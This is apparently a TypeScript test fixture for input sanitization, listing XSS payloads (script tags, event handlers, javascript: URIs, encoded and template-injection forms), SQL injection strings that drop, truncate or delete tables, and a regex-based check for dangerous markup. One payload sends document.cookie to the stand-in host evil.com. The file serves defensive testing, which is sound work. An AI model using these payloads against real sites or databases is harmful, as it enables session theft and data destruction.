/**
 * XSS attack vectors for testing input sanitization.
 * Each payload should be neutralized by the sanitization layer.
 */
export const XSS_PAYLOADS = [
  // Basic script injection
  '<script>alert("xss")</script>',
  '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
  
  // Event handler injection
  '<img src=x onerror=alert("xss")>',
  '<svg onload=alert("xss")>',
  '<body onload=alert("xss")>',
  '<input onfocus=alert("xss") autofocus>',
  '<marquee onstart=alert("xss")>',
  '<div onmouseover=alert("xss")>hover me</div>',
  
  // JavaScript URI
  '<a href="javascript:alert(\'xss\')">click</a>',
  '<a href="data:text/html,<script>alert(\'xss\')</script>">click</a>',
  '<a href="vbscript:alert(\'xss\')">click</a>',
  
  // CSS-based attacks
  '<style>body{background:url("javascript:alert(\'xss\')")}</style>',
  '<div style="background:url(javascript:alert(\'xss\'))">',
  
  // Encoded attacks
  '<scr\x00ipt>alert("xss")</scr\x00ipt>',
  '<img src="x" onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;">',
  
  // Meta/iframe injection
  '<iframe src="javascript:alert(\'xss\')">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',
  '<object data="javascript:alert(\'xss\')">',
  '<embed src="javascript:alert(\'xss\')">',
  
  // Template literals
  '${alert("xss")}',
  '{{constructor.constructor("alert(1)")()}}',
  
  // SQL metacharacters (not XSS but should be tested)
  "'; DROP TABLE companies; --",
  "1' OR '1'='1",
  "1; SELECT * FROM audit_logs --",
  "' UNION SELECT * FROM company_members --",
];

export const SQL_INJECTION_PAYLOADS = [
  "'; DROP TABLE companies; --",
  "1' OR '1'='1",
  "1; SELECT * FROM audit_logs --",
  "' UNION SELECT * FROM company_members --",
  "1'; TRUNCATE TABLE consents; --",
  "admin'--",
  "' OR 1=1 --",
  "'); DELETE FROM companies WHERE ('1'='1",
];

/**
 * Assert that a sanitized output does not contain dangerous patterns.
 */
export function assertSanitized(output: string): void {
  const dangerous = [
    /<script/i,
    /javascript:/i,
    /vbscript:/i,
    /on\w+\s*=/i,
    /data:\s*text\/html/i,
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /<style/i,
  ];
  
  for (const pattern of dangerous) {
    if (pattern.test(output)) {
      throw new Error(`Sanitization failed: output contains dangerous pattern ${pattern}: "${output.substring(0, 100)}"`);
    }
  }
}
